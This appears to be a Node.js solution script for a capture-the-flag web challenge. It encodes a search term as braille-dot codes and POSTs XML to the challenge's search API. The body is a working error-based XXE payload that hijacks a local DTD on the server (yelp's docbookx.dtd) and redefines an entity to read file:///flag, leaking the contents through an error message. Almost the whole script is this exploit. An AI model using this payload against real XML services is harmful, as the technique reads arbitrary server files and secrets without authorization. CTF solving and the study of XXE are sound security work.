function AjaxFormPost(message) {
  var datasend;

  var blindvalues = [
    '10',    '120',   '140',    '1450',   '150',   '1240',  '12450',
    '1250',  '240',   '2450',   '130',    '1230',  '1340',  '13450',
    '1350',  '12340', '123450', '12350',  '2340',  '23450', '1360',
    '12360', '24560', '13460',  '134560', '13560',
  ];

  var blindmap = new Map();
  var i;
  var message_new = '';

  for (i = 0; i < blindvalues.length; i++) {
    blindmap[i + 97] = blindvalues[i];
  }

  for (i = 0; i < message.length; i++) {
    //console.log(message[i] + " has charcode " + message[i].charCodeAt(0));
    message_new += blindmap[(message[i].charCodeAt(0))];
  }

  console.log("Searching " + message + " with " + message_new);
  const fetch = require("node-fetch");
  fetch("https://bnv.web.ctfcompetition.com/api/search", {
  "headers": {
    "content-type": "text/xml",
    "charset": "utf-8",
  },
  "referrer": "https://bnv.web.ctfcompetition.com/",
  "referrerPolicy": "no-referrer-when-downgrade",
  "body": `<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///flag">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<message>`+message_new+`</message>`,
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
})
  .then( response => response.text() )
  .then( json => console.log(json) )
  .catch( error => console.error('error:', error) );



}

AjaxFormPost("paris");



